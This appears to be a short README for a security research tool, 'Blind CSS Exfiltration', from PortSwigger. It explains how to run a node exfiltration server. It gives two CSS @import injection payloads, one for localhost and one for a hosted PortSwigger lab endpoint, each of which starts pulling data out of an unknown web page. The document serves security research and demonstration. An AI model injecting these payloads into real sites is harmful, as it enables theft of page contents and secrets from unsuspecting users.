# Blind CSS Exfiltration
# Exfiltrate unknown web pages

## Using the exfiltrator
To run your own version of the exfiltrator you need to first grab the source code from above and then run it using node:
node css-exfiltrator-server.js

This will start the server. Once the server is started it should be running on localhost:5001 by default. You can change this in the code. To start an exfiltration you simply need to make an @import request to the exfiltrator server:

```html
<style>
@import 'http://localhost:5001/start';    
</style>
```

## Demo
You can get a demo of our exfiltrator using PortSwigger labs. Note you can only exfiltrate once per IP. If more than one person tries to exfiltrate with the same IP the previous session will be deleted. Enjoy!

```html
<style>
@import 'https://portswigger-labs.net/blind-css-exfiltration/start';    
</style>
```

## How it works

I've written a blog post on how the whole process works. You can read it at:
[Blind CSS Exfiltration](https://portswigger.net/research/blind-css-exfiltration)
